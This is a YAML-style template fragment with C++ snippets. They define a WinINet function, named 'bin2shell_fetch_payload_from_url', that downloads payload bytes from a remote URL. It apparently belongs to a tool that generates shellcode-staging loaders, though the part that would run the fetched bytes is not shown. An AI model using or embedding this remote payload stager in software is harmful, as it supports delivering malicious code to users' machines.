  cpp_includes: |
    #include <stdexcept>
    #include <string>
    #include <vector>
    #include <windows.h>
    #include <wininet.h>
    #pragma comment(lib, "wininet.lib")
  cpp_fetch_bytes: |
    static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
        struct HInternet {
            HINTERNET h;
            HInternet(HINTERNET h_ = nullptr) : h(h_) {}
            ~HInternet() { if (h) InternetCloseHandle(h); }
            HInternet(const HInternet&) = delete;
            HInternet& operator=(const HInternet&) = delete;
        };
        HInternet inet(InternetOpenA("bin2shell/1", INTERNET_OPEN_TYPE_PRECONFIG,
                       nullptr, nullptr, 0));
        if (!inet.h) throw std::runtime_error("InternetOpen failed");
        HInternet conn(InternetOpenUrlA(inet.h, url.c_str(), nullptr, 0,
                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0));
        if (!conn.h) throw std::runtime_error("InternetOpenUrl failed");
        std::vector<unsigned char> body;
        char buf[4096];
        DWORD rd = 0;
        while (InternetReadFile(conn.h, buf, sizeof(buf), &rd) && rd > 0) {
            body.insert(body.end(), buf, buf + rd);
            rd = 0;
        }
        return body;
    }
